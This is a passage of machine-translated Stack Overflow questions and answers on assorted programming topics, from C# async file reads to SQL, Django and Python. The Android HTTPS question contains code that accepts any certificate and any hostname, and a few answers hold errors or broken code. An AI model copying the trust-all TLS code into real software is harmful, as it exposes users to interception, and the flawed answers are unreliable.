        Console.WriteLine($"Creation took: {duration1:#,0} ms, Task.IsCompleted: {isCompleted}");
        Console.WriteLine($"Calling await took:  {duration2:#,0} ms, Task.IsCompleted: {fileTask.IsCompleted}"); 
```

> 创建耗时：**43**毫秒，Task.IsCompleted：**False**
> 调用等待耗时： **508**毫秒，Task.IsCompleted：**True**

您可以在评论和这个问题中找到更多信息：[File.ReadAllLinesAsync() blocks the UI thread](https://stackoverflow.com/questions/63217657/why-file-readalllinesasync-blocks-the-ui-thread)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2018-10-16T07:19:09.530

```
private async Task<string> readFile(string sourceFilePath)
    {
        using (var fileStream = new FileStream(sourceFilePath, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
        {
            using (var streamReader = new StreamReader(fileStream))
            {
                string data = await streamReader.ReadToEndAsync().ConfigureAwait(false);
                streamReader.Close();
                fileStream.Close();
                return data;
            }

        }
    } 
```

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-10-31T21:54:49.317

试试这个：

```
private async void button1_Click(object sender, RoutedEventArgs e)
{
    button1.IsEnabled = false;
    try
    {
        var s = await Task.Run(() => File.ReadAllLines("Words.txt").ToList());
        // do something with s
    }
    finally
    {
        button1.IsEnabled = true;
    }
} 
```

**编辑：**

你不需要 try-finally 就可以了。这实际上只是您需要更改的一行。解释它是如何工作的：这会产生另一个线程（实际上是从线程池中获取一个）并让该线程读取文件。当文件完成读取后，将调用 button1_Click 方法的其余部分（从 GUI 线程）并得到结果。请注意，这可能不是最有效的解决方案，但它可能是对您的代码进行的最简单的更改，不会阻塞 GUI。

* * *

## 回答 #5

> 赞同：-4
> 
> 时间：2017-01-07T11:46:30.920

我还遇到了您问题中描述的问题。我在以前的答案中更简单地解决了它：

```
string[] values;
StorageFolder folder = ApplicationData.Current.LocalFolder; // Put your location here.
IList<string> lines = await FileIO.ReadLinesAsync(await folder.GetFileAsync("Words.txt"););
lines.CopyTo(values, 0); 
```****

# https - 发布 HTTPS 表单会导致 html 404 状态代码

> ID：13167936
> 
> 赞同：1
> 
> 时间：2012-10-31T21:48:06.550
> 
> 标签：https, http-post, http-status-code-404, name-value

当我尝试通过 httppost (https) 登录时，我不断收到来自服务器的 HTML 404 回复。不确定这是 cookie 问题还是其他问题。代码应该很好，因为我从另一个活动中复制了它。我需要一些帮助。

这是我当前的代码：

```
public int postData(String usernamne, String password) {
    String url = "https://domainname.com/nclogin.submit";
    HttpPost httppost = new HttpPost(url);

    try {
        KeyStore trusted = null;
        try {
            trusted = KeyStore.getInstance("BKS");
        } catch (KeyStoreException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        trusted.load(null, "".toCharArray());
        MySSLSocketFactory sslf = null;
        try {
            sslf = new MySSLSocketFactory(trusted);
        } catch (KeyManagementException e) {
            Log.d(TAG, "Exception " + e);
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (UnrecoverableKeyException e) {
            Log.d(TAG, "Exception " + e);

            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (KeyStoreException e) {

            Log.d(TAG, "Exception " + e);
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        sslf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);

        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();

         nameValuePairs.add(new BasicNameValuePair("f_username", "myemail@address.com"));
         nameValuePairs.add(new BasicNameValuePair("f_passwd", "mypassword"));
         nameValuePairs.add(new BasicNameValuePair("f_method", "LOGIN"));

         httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));

         SchemeRegistry schemeRegistry = new SchemeRegistry();
         schemeRegistry.register(new Scheme("https", sslf, 443));
         SingleClientConnManager cm = new SingleClientConnManager(httppost.getParams(), schemeRegistry);

         // NEW API WONT ALLOW THIS IN THE MAIN THREAD! hence ASYNC
         DefaultHttpClient client = new DefaultHttpClient(cm, httppost.getParams());

         HttpResponse result = client.execute(httppost);
         // Check if server response is valid
         StatusLine status = result.getStatusLine();
         Log.d(TAG, "STatus" + result.getStatusLine());
         if (status.getStatusCode() != 200) {
             throw new IOException("Invalid response from server: " + status.toString());
         }

         HttpEntity entity = result.getEntity();
         InputStream is = entity.getContent();
            if (is != null) {
                is.close(); // release connection
            }
            String phpsessid = "";
            // cookies from another blog
            // http://stackoverflow.com/questions/4224913/android-session-management
            List cookies = client.getCookieStore().getCookies();
            if (cookies.isEmpty()) {
                Log.d(TAG, "no cookies received");
            } else {
                for (int i = 0; i < cookies.size(); i++) {
                    // Log.d(TAG, "COOKIE-" + i + " " +
                    // cookies.get(i).toString());

                    if (cookies.get(i).toString().contains("PHPSESSID")) {
                        phpsessid = cookies.get(i).toString();
                        Log.d(TAG, "COOKIE FOR PHPSESSID - " + phpsessid);
                    }
                }
            } // end of blog

            entity.consumeContent();
            client.getConnectionManager().shutdown();

    } catch (ClientProtocolException e) {
        // TODO Auto-generated catch block
    } catch (IOException e) {
        // TODO Auto-generated catch block
    } catch (NoSuchAlgorithmException e1) {
        // TODO Auto-generated catch block
        e1.printStackTrace();
    } catch (CertificateException e1) {
        // TODO Auto-generated catch block
        e1.printStackTrace();
    }

    return 1;
} // end of postData()

    public class MySSLSocketFactory extends SSLSocketFactory {
    SSLContext sslContext = SSLContext.getInstance("TLS");

    public MySSLSocketFactory(KeyStore truststore)
            throws NoSuchAlgorithmException, KeyManagementException,
            KeyStoreException, UnrecoverableKeyException {
        super(truststore);

        TrustManager tm = new X509TrustManager() {
            public void checkClientTrusted(X509Certificate[] chain,
                    String authType) throws CertificateException {
            }

            public void checkServerTrusted(X509Certificate[] chain,
                    String authType) throws CertificateException {
            }

            public X509Certificate[] getAcceptedIssuers() {
                return null;
            }
        };

        sslContext.init(null, new TrustManager[] { tm }, null);
    }

    @Override
    public Socket createSocket(Socket socket, String host, int port,
            boolean autoClose) throws IOException, UnknownHostException {
        return sslContext.getSocketFactory().createSocket(socket, host,
                port, autoClose);
    }

    @Override
    public Socket createSocket() throws IOException {
        return sslContext.getSocketFactory().createSocket();
    } 
```

我知道 url 是正确的，名称值对也是正确的，因为我可以通过浏览器或 wget 通过查询字符串登录：

```
https://domainname.com/nclogin.submit?f_username=myemail@email.com&f_passwd=password&f_method=LOGIN 
```

这会导致建立连接并重定向到我的仪表板页面。

登录页面的 HTML 代码（源代码）可以在 [这里查看](http://pastebin.com/ZshrFUP2)

# cuda - cuda 16 位整数

> ID：13167943
> 
> 赞同：3
> 
> 时间：2012-10-31T21:48:35.573
> 
> 标签：cuda, uint

CUDA 中有 16 位长的变量吗？我需要一个 16 位的无符号整数。我试过了：

```
uint16
uint16_t 
```

但是没有人被nvcc认可。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-31T21:58:49.090

可能你应该试试普通的 c`unsigned short`吗？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-01-16T20:41:31.910

CUDA 8（计算能力 6.x）带有[半精度内在函数](https://devblogs.nvidia.com/parallelforall/mixed-precision-programming-cuda-8/)。您可以使用 16 位浮点数据类型`half`或整数类型`short2`/ `char4`。这些混合精度类型被打包到 32 位设备寄存器中，与[仅使用](https://stackoverflow.com/q/12733856/5495432) `unsigned short`.

# sql - 如果存在另一个记录，则排除组中记录的值

> ID：13167948
> 
> 赞同：2
> 
> 时间：2012-10-31T21:48:56.550
> 
> 标签：sql, oracle

在下面的示例表中，我试图找出一种方法来对 id 中不存在标记“C”的所有标记求和。当 id 中确实存在标记“C”时，我想要该 id 上的金额总和，不包括标记“A”的金额。如图所示，我想要的输出在底部。我考虑过使用分区和 EXISTS 命令，但我在概念化解决方案时遇到了麻烦。如果你们中的任何人都可以看看并指出我正确的方向，将不胜感激:)

样品表：

```
id   mark  amount
------------------
1    A     1
2    A     3
2    B     2
3    A     2
4    A     1
4    B     3
5    A     1
5    C     3
6    A     2
6    C     2 
```

所需的输出：

```
id   sum(amount)
-----------------
1    1
2    5
3    2
4    4
5    3
6    2 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:56:07.563

```
select 
  id, 
  case 
     when count(case mark when 'C' then 1 else null end) = 0 
     then 
        sum(amount)
     else 
        sum(case when mark <> 'A' then amount else 0 end)
  end
from sampletable
group by id 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T22:02:21.460

这是我的努力：

```
select id, sum(amount) from table t where not t.id = 'A' group by id 
having id in (select id from table t where mark = 'C') 
union  
select id, sum(amount) from table t where t.id group by id 
having id not in (select id from table t where mark = 'C') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T22:12:20.477

```
SELECT
  id,
  sum(amount) AS sum_amount
FROM atable t
WHERE mark <> 'A'
  OR NOT EXISTS (
    SELECT *
    FROM atable
    WHERE id = t.id
      AND mark = 'C'
  )
GROUP BY
  id
; 
```

# javascript - Sencha touch - 是否可以在客户端存储大型数据库

> ID：13167957
> 
> 赞同：3
> 
> 时间：2012-10-31T21:49:41.203
> 
> 标签：javascript, html, web-applications, sencha-touch

我希望能够在客户端上存储大量数据，但也不是微不足道的数据。基本上，我希望能够使用 Web 技术在客户端使用 SQLite 数据库之类的东西。该应用程序是一本外语词典，因此我希望在下载该应用程序后可以访问这些数据。

这可以通过 Sencha touch 或任何 JavaScript/HTML5 技术实现吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:54:34.020

根据目标浏览器，有几个选项：

*   localStorage（具有跨浏览器回到 IE8 的优势）
*   WebSQL（已弃用）
*   索引数据库
*   应用程序缓存（这是数据存储的延伸......但它/可以/可以完成）

所有这些技术都有存储限制，其中一些因浏览器而异，更复杂的是，有些技术会让用户选择允许扩展存储上限。

我使用 localStorage 取得了不错的效果，并且使用了 JavaScript 压缩库 ( [http://code.google.com/p/jslzjb/](http://code.google.com/p/jslzjb/) )，您可以获得一些存储优势（尽管根据我的经验，不是很多。如果您'在 5.5Mb 和 5MB 的限制下，压缩可能会让你通过，不过）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:51:09.433

是的。唯一的问题是什么类型的数据，但你可以存储任何东西。

如果它有很多文本/对象数据，您可以使用本地存储。不确定字典有多大，但这可能是一个非常简单的解决方案。您可以将字典下载到客户端，然后使用[JSON.stringify](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/JSON/stringify) () 将您的数据转换为文本（字符串），本地存储可以存储并检索它。

帮助链接，其他选项包括数据库选项： [http ://www.html5rocks.com/en/tutorials/offline/storage/](http://www.html5rocks.com/en/tutorials/offline/storage/)

# mongodb - 一年的计数频率

> ID：13167960
> 
> 赞同：1
> 
> 时间：2012-10-31T21:50:05.307
> 
> 标签：mongodb, mapreduce, mongoid3

我正在尝试使用 map/reduce 计算一年的频率，这是代码

```
map = %Q{
  function(){
    emit({}, { 
      year: this.birthdate.getFullYear(),
      count: 1
    })
  }
}
reduce = %Q{
  function(key, values){
    var agg = { }
    values.forEach( function(value){
      if(agg[value.year]){
        agg[value.year] += value.count
      } else {
        agg[key] = value.count
      }
    })
    return agg
  }
}
User.map_reduce(map, reduce).out(inline: true) 
```

它返回

```
=> [{"_id"=>{}, "value"=>{"2004"=>2.0, "2002"=>1.0, "2005"=>1.0}}] 
```

但是我的数据库中有很多年，这只是跟踪其中的 3 年。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-01T01:31:08.800

现在它的工作......这是代码

```
map = %Q{
  function(){
    var today = new Date()
    var age = today.getFullYear() - this.birthdate.getFullYear()
    var m = today.getMonth() - this.birthdate.getMonth()
    if (m < 0 || (m === 0 && today.getDate() < this.birthdate.getDate()))
        age--

    emit(age, { count: 1 })
  }
}
reduce = %Q{
  function(key, values){
    var sum = 0

    values.forEach( function(value){
      sum += value.count
    })

    return { count: sum }
  }
}

scoped.map_reduce(map, reduce).out(inline: true) 
```

# cakephp - 如何根据 CakePHP 中的子结果限制查询结果？

> ID：13167968
> 
> 赞同：0
> 
> 时间：2012-10-31T21:50:41.683
> 
> 标签：cakephp, cakephp-2.0, conditional-statements

在 CakePHP 中，如果我运行以下 find 命令

```
$this->Instructor->find('all'); 
```

返回以下内容：

```
Array
(
    [0] => Array
        (
            [Instructor] => Array
                (
                    [id] => 1
                    [user_id] => 3
                    [bio] => A billionaire playboy, industrialist and ingenious engineer, Tony Stark suffers a severe chest injury during a kidnapping in which his captors attempt to force him to build a weapon of mass destruction. He instead creates a powered suit of armor to save his life and escape captivity. He later uses the suit to protect the world as Iron Man.
                )

            [User] => Array
                (
                    [id] => 3
                    [first_name] => Tony
                    [last_name] => Stark
                    [asurite_user] => tstark
                    [asurite_id] => 
                    [password] => 
                    [email] => tstark@example.com
                    [created] => 2012-10-30 09:57:36
                    [modified] => 2012-10-30 09:57:36
                )

            [Course] => Array
                (
                    [0] => Array
                        (
                            [id] => 1
                            [slug] => beatles
                            [sln] => AAA001
                            [course_number] => 
                            [title] => The Beatles
                            [description] => This is a class about the Beatles.  If this were a real description, more information would be listed here.
                            [state] => 
                        )

                    [1] => Array
                        (
                            [id] => 2
                            [slug] => elvis
                            [sln] => AAA002
                            [course_number] => 
                            [title] => Elvis: The King of Rock
                            [description] => All about the king of rock and roll, Elvis Presley.
                            [state] => 
                        )

                )

        )

    [1] => Array
        (
            ... 
```

“Instructor”和“Course”之间存在多对多的关系。如何根据每个“讲师”所属的“课程”过滤结果？我尝试了以下但没有成功：

```
$instructors = $this->Instructor->find('all', array(
    'conditions' => array('Course.id' = 2)
)); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-01T04:04:16.483

如果您尝试根据子项的条件限制您的父项，您可以通过子模型而不是主模型进行主查询，并[包含（）](http://book.cakephp.org/2.0/en/core-libraries/behaviors/containable.html)其余部分，或者使用 MySQL Joins - 在 CakePHP 中可用通过[joins()](http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html#joining-tables)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T22:15:03.177

您需要（重新）将 Instructor 模型的关联与 hasOne 绑定并使用以下设置：

```
'CoursesInstructor' => array(
    'className' => 'CoursesInstructor',
    'foreignKey' => false,
    'conditions' => 'Instructor.id = CoursesInstructor.id'),
'Course' => array(
    'className' => 'Course',
    'foreignKey' => false,
    'conditions' => 'CoursesInstructor.course_id = Course.id'); 
```

这将生成具有所需连接的正确 SQL，并且您的条件将起作用。

# c - sscanf 的分段错误

> ID：13167971
> 
> 赞同：1
> 
> 时间：2012-10-31T21:51:00.060
> 
> 标签：c

我正在编写一个小型 C 程序来测试一个概念，但我遇到了一些问题。首先，这是我的所有代码：

```
#include <stdio.h>
#include <string.h>

char one[] = "Figure A 200 200 =\0";
char two[] = "Figure B 300 200 =\0";

int main(void)
{
  char buffero[300];
  char buffert[300];
  memset(buffero, 0, sizeof(buffero));
  memset(buffert, 0, sizeof(buffert));

  int * doubleo = 0;
  int * doublet = 0;

  sscanf(one, "%s %s %d %d ",buffero, buffert, doubleo, doublet);
  printf("%s %s %d %d", buffero, buffert, *doubleo, *doublet);

  memset(buffero, 0, sizeof(buffero));
  memset(buffert, 0, sizeof(buffert));

  sscanf(two, "%s %s %d %d ", buffero, buffert, doubleo, doublet);
  printf("%s %s %d %d", buffero, buffert, *doubleo, *doublet);
}; 
```

它与我尝试实施的一些修复程序有些复杂，但并不是那么可怕。

它编译，但是当我运行它时，我得到一个分段错误。

GDB 报告：

```
#3  0x0000000000400683 in main () at mis_test.c:15
15    sscanf(one, "%s %s %d %d ",buffero, buffert, doubleo, doublet); 
```

有人可以在这里提供一些见解吗？我对 C 相当陌生，我知道这是一个非常非常简单的问题，正盯着我看，但我似乎无法理解。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-31T21:52:46.453

这是因为您使用的是尚未分配内存的 int 指针。

```
 int * doubleo = 0;
 int * doublet = 0; 
```

您可以简单地使用两个整数：

```
 int doubleo = 0;
 int doublet = 0; 
```

然后使用 sscanf 调用 sscanf ，`&`因为 sscanf 需要指向整数的指针：

```
 sscanf(one, "%s %s %d %d ",buffero, buffert, &doubleo, &doublet); 
```

请注意，您不需要自己终止字符串。它由编译器为您完成。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:57:01.753

Try this :

```
#include <stdio.h>
#include <string.h>

char one[] = "Figure A 200 200 =\0";
char two[] = "Figure B 300 200 =\0";

int main(void)
{
   char buffero[300];
   char buffert[300];
   memset(buffero, 0, sizeof(buffero));
   memset(buffert, 0, sizeof(buffert));

   int doubleo = 0;
   int doublet = 0;

   sscanf(one, "%s %s %d %d ",buffero, buffert, &doubleo, &doublet);
   printf("%s %s %d %d", buffero, buffert, doubleo, doublet);

   memset(buffero, 0, sizeof(buffero));
   memset(buffert, 0, sizeof(buffert));

   sscanf(two, "%s %s %d %d ", buffero, buffert, &doubleo, &doublet);
   printf("%s %s %d %d", buffero, buffert, doubleo, doublet);
}; 
```

Or allocate memory for *doubleo and *doublet

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:54:45.370

For 格式说明符`%d` `sscanf`需要指向类型的接收对象的指针`int`。您提供了无处指向的指针（空指针）。这就是导致崩溃的原因。

如果您坚持使用显式指针，首先您必须确保它们指向有效`int`对象

```
int io, it;

int * doubleo = &io;
int * doublet = &it; 
```

`sscanf`将数据读入`io`和`it`对象

```
sscanf(one, "%s %s %d %d ", buffero, buffert, doubleo, doublet); 
```

当然，这里没有真正需要这些显式指针。你可以完全摆脱`doubleo`并`doublet`做

```
sscanf(one, "%s %s %d %d ", buffero, buffert, &io, &it); 
```

# c++ - 在 C++ 中使用数组进行动态内存分配

> ID：13167973
> 
> 赞同：0
> 
> 时间：2012-10-31T21:51:09.700
> 
> 标签：c++

我正在尝试将一个 int 插入到类对象中的数组中，但我无法弄清楚我做错了什么。我的代码的当前状态永远不会将 int 插入到数组中。

基本上我想做的是当我调用 insert(int) 时，它会检查数组中是否还有剩余空间，如果有，它将添加它，否则它将重新分配 8 个更多空间大批。

这是一些相关的课程信息

```
private:

    unsigned Cap;    // Current capacity of the set
    unsigned Num;    // Current count of items in the set
    int * Pool;      // Pointer to array holding the items

  public:

    // Return information about the set
    //
    bool is_empty() const { return Num == 0; }
    unsigned size() const { return Num; }
    unsigned capacity() const { return Cap; }

    // Initialize the set to empty
    //
    Set()
    {
      Cap = Num = 0;
      Pool = NULL;
    } 
```

这是我正在处理的代码

```
bool Set::insert(int X)
{
        bool Flag = false;
        if (Num == Cap)
        {
                //reallocate
                const unsigned Inc = 8;

                int * Temp = new int[Cap+Inc];

                for (unsigned J=0;J<Num;J++)
                {
                        Temp[J] = Pool[J];
                }

                delete [] Pool;
                Pool = Temp;
                Cap = Cap+Inc;
        }

        if(Num < Cap)
        {
                Pool[Num+1] = X;

                Flag = true;
        }
        return Flag;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T21:53:45.167

您的`insert`功能永远不会更新`Num`。尝试`Pool[Num++] = X;`或类似的东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:56:45.520

You probably want to increment the number of element but only **after** copying the new element in: the first element should have index 0\. Basically, your `insert()` function should look something like this:

```
bool Set::insert(int X)
{
    if (Num == Cap)
    {
        const unsigned Inc(std::max(8, 2 * Cap));
        std::unique_ptr<int[]> Temp(new int[Cap+Inc]);
        std::copy(Pool.get(), Pool.get() + Num, Temp.get());
        Pool.swap(Temp);
        Cap += Inc;
    }
    Pool[Num] = X;
    ++Num;

    return true;
} 
```

Of course, this assumes that `Pool` is reasonably declared as `std::unique_ptr<int[]>` (or something with similar functionality which is easy to write if necessary). The reason to use `std::unique_ptr<int[]>` rather than raw pointers is that they automatically clean up resources when they are destroyed. Copying a sequence of `int`s won't throw an exception but if `int` get's replaced by a `std::string` or a template parameters there is potential to throw exceptions.

# python - django 为对象创建个人资料或页面

> ID：13167983
> 
> 赞同：0
> 
> 时间：2012-10-31T21:52:49.933
> 
> 标签：python, django

我有一个场地对象，并希望有一个与该对象关联的配置文件/页面，其中包含场地特定信息，如价格、营业时间等。这是我的场地对象

```
class Venue(model.Models):
    name=models.CharField(max_length=100)
    # ...
    image=models.ImageField(upload_to=...) 
```

现在我不知道下一步该去哪里使用`VenueProfile`模型和将这些绑定在一起的视图，这就是我能想到的：

```
class VenueProfile(model.Models):
    venue=models.OneToOneField(Venue, related_name='venueProfile')
    # ...
    # info i want stored about the venue
    # ... 
```

有人可以帮我弄清楚是否

1.  这是对象配置文件/页面的正确模型设置类型
2.  我该如何为此写一个视图？将场地模型与剖面模型连接并渲染模板。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T22:08:50.197

是的，你采取了正确的方法。通常当你想要一个解耦的实体，然后如果你想将属性与之关联（例如，用户的个人资料），`OneToOneField`这是非常有用的。

至于连接，因为它们是两个单独的表，所以没有真正好的合并它们的方法。但是，由于您使用的是`related_name`参数，即使模型不同，您也可以通过以下方式轻松访问其他模型的属性：

```
venue = Venue.objects.get(...)
venue.name             <- Venue attribute
venue.venueProfile.foo <- VenueProfile attribute 
```

这种方法的一个缺点是涉及到数据库查询。为了提高效率，您可以使用其中任何一种方法。然而，第一种方法更有效，因为为此，Django 将使用 SQL 连接，它比“Python 的”连接更快。

```
profile = VenueProfile.objects.filter(...).select_related('venue')[0]
venue = profile.venue <- no extra query 
```

或者这里 Django 的这种方法将在 Python 中执行连接的速度很慢：

```
venue = Venue.objects.filter(...).prefetch_related('venueProfile')[0] 
```

此时，这些只是常规对象，因此您可以轻松地将它们传递给模板。下面是一个简单的视图、urlconfig和模板示例：

```
def all_venues(request):
    # note that querying profiles...
    venues = VenueProfile.objects.all().select_related('venue')
    return render_to_response('template.html', {'venues':venues})

def venue(request, venue_id):
    venue = VenueProfile.objects.filter(venue__pk=venue_id).select_related('venue')
    if len(venue) == 1:
        venue = venue[0]
    else:
        raise Http404
    ... 
```

网址配置：

```
url(r'^venue/all/$', 'all_venues', name='all_venues'),
url(r'^venue/(?P<venue_id>\d+)/$', 'venue', name='venue'), 
```

和模板

```
{% load url from future %}
{% for venue_profile in venues %}
    {% with venue=venue_profile.venue profile=venue_profile %}
        <ul>
            <li>
                <a href="{% url 'venue' venue_id=venue.pk %}">
                    {{ venue.name }}</a><br>
                <img href="{{ venue.image.url }}"><br>
                {{ profile.foo }}
            </li>
        </ul>
    {% endwith %}
{% empty %}
    No venues
{% endfor %} 
```

# struts2 - 表格数据支柱

> ID：13167984
> 
> 赞同：1
> 
> 时间：2012-10-31T21:52:53.877
> 
> 标签：struts2, tabular, actioncontext

我试图从主从表单捕获数据返回一个 JSON 对象，如下所示我的表单类似于这个[http://www.vitarara.org/cms/struts_2_cookbook/creating_a_theme](http://www.vitarara.org/cms/struts_2_cookbook/creating_a_theme)我遵循了这个指南[http://struts.apache.org /2.1.6/docs/tabular-inputs.html](http://struts.apache.org/2.1.6/docs/tabular-inputs.html)我可以捕获主数据，但如何访问详细信息？我此刻得到的结果是

```
{"codigo":"RQ-201000-1210-00001","fecha":"Oct 25, 2012 12:00:00 AM","dreqproductos":[]} 
```

我的表格是：

我怎样才能获得 dreqproductos？

```
<input name="reqproducto.codigo"   />
<input name="reqproducto.fecha"   />

<input name="reqproducto.dreqproductos[1].masterproducto"   />
<input name="reqproducto.dreqproductos[1].cantidad"         />

<input name="reqproducto.dreqproductos[2].masterproducto"   />
<input name="reqproducto.dreqproductos[2].cantidad"         /> 
```

我的课是

```
public class Reqproducto  implements java.io.Serializable {
     private Integer id;
     private String codigo;
     private Date fecha;
     private Set dreqproductos = new HashSet(0);
} 
```

和

```
public class Dreqproducto  implements java.io.Serializable {
     private Integer id;
     private Masterproducto masterproducto;
     private Reqproducto reqproducto;
     private BigDecimal cantidad;
} 
```

我的行动是

```
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package actions;

import com.google.gson.Gson;
import com.opensymphony.xwork2.ActionContext;
import com.opensymphony.xwork2.ActionSupport;
import hibernate.domain.Centrocosto;
import hibernate.domain.Dreqproducto;
import hibernate.domain.Reqproducto;
import hibernate.util.hibernateUtil;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.util.*;
import model.dao.impl.DaoReqproductoImpl;
import org.hibernate.HibernateException;
import org.hibernate.Query;
import org.hibernate.Session;
import org.hibernate.Transaction;
/**
 *
 * @author DEV11
 */
public class ActionReqProducto extends ActionSupport{

    private InputStream inputStream;
    public InputStream getInputStream() {
        return inputStream;
    }

    public Reqproducto reqproducto;
    public void setReqproducto(Reqproducto reqproducto) {
        this.reqproducto = reqproducto;
    }

    public String ReqproductoIns() throws UnsupportedEncodingException {
        //CAPTURA
        String msg = "VOID";
        Session session = hibernateUtil.getSessionFactory().getCurrentSession();
        //Session session = HibernateUtil.getSessionFactory().openSession();
        Transaction transaction = null;

        try {
            transaction = session.beginTransaction();

            //////////////////////////////////////////////////////////////
            if (reqproducto.getId() == null) {//INSERTAR
                //CABECERA INSERTAR GERISTRO
                session.save(reqproducto);

                msg = "INSERT ";
            } else {//ACTUALIZAR
                //CABECERA ACTUALIZAR REGISTRO
                String queryString = "from Reqproducto where id = :id";
                Query query = session.createQuery(queryString);
                query.setInteger("id", reqproducto.getId());
                session.update(reqproducto);

                msg = "UPDATE ";
            }
            //////////////////////////////////////////////////////////////

            //session.getTransaction().commit();
            transaction.commit();

            msg += "OK" + reqproducto.getId();//+session.getIdentifier(reqproducto);;
        } catch (HibernateException e) {
            transaction.rollback();
            //e.printStackTrace();
            msg = "ERROR: " + e.getMessage();
        } finally {
            //session.close();
        }

        //RESPUESTA
        Gson gson = new Gson();
        //String json  = "{cabecera:{'id':'"+id+"','codigo':'"+codigo+"','descripcion':'"+descripcion+"','abreviatura':'"+abreviatura+"','visible':'"+visible+"'}, msg:'Devolviendo Resultado via Ajax en \"Español\"'}";
        String json = gson.toJson(this.reqproducto);
        inputStream = new ByteArrayInputStream(json.getBytes("UTF-8"));
        return SUCCESS;
    }
} 
```

# python - 检查列表python中的字符串

> ID：13167990
> 
> 赞同：1
> 
> 时间：2012-10-31T21:53:31.193
> 
> 标签：python, python-2.7

可以说我有

```
a = "FIFA 13" 
```

然后我写

```
"bla" and "13" in a 
```

结果是真的……为什么？**bla**不在a中

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-31T21:54:53.700

您的布尔表达式被评估为`("bla") and ("13" in a)`，非空字符串评估为 true，因此如果`"13" in a`为 true，则整个表达式将评估为 true。

相反，使用`all()`：

```
all(x in a for x in ("bla", "13")) 
```

或者只是分别检查：

```
"bla" in a and "13" in a 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-31T21:55:42.793

你应该使用

```
In [1]: a = "FIFA 13"

In [2]: "bla" in a and "13" in a
Out[2]: False 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-31T21:56:44.690

`"bla"`是**真的**

`"13" in a`是**真的**

因此，`"bla" and "13" in a`是**真的**

你想写的可能是：`("bla" in a) and ("13" in a)`

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-31T21:57:22.240

您的代码不会像读取的那样被解释：

```
("bla") and ("13" in a) 
```

`"bla"`是真实的，所以它自动评估为`True`。`"13" in a`可能是`True`。`False and True`计算结果为`True`，因此`"bla"`并未真正考虑在内。

你必须更明确一点：

```
'bla' in a and '13' in a 
```

或者您可以使用不可读的单行：

```
all(map(a.__contains__, ('bla', '13'))) 
```

对于短路的单线，我认为您必须使用`itertools.imap`而不是`map`..

# php - 使用 php 将 Doc 文件转换为 Docx？

> ID：13167992
> 
> 赞同：1
> 
> 时间：2012-10-31T21:53:38.103
> 
> 标签：php, wordpress

我想读取 Doc 文件的内容或将 doc 文件转换为 Docx

我使用了 COM 对象，但它不起作用，因为我有基于 linux 的服务器。

我也尝试过使用 shell_exec 命令，但它不起作用，因为 shared server 上没有提供任何功能。

有没有api？这样我就可以使用 Docx 转换 Doc 文件

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:58:05.500

If you want to use PHP, try out [PHPWord](http://phpword.codeplex.com/).

There's an example on how to convert from .doc to .docx on [this](http://phpword.codeplex.com/discussions/272163) page:

> require_once '../PHPWord.php';
> 
> $PHPWord = new PHPWord();
> 
> $document = $PHPWord->loadTemplate('Excel2003.doc');
> 
> // Save File
> 
> $objWriter = PHPWord_IOFactory::createWriter($PHPWord, 'Word2007');
> 
> $objWriter->save('Excel2007.docx');